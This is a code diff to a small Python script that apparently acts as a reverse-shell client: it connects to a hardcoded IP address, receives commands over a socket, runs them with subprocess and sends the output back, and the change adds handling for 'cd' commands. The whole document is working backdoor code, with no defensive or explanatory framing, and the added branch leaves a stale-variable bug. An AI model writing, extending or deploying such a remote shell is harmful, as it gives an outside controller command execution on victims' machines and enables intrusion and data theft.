@@ -1,4 +1,5 @@
 import socket
+import os
 import subprocess
 
 ip = "67.85.111.80"
@@ -16,7 +17,10 @@ while True:
     cmd = cmd_raw.decode("utf-8")
 
     try:
-        response = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE)
+        if "cd" in cmd:
+            os.chdir(cmd.split(" ")[1])
+        else:
+            response = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE)
         if not response.stdout:
             s.send(bytes("done", "utf-8"))
         else:
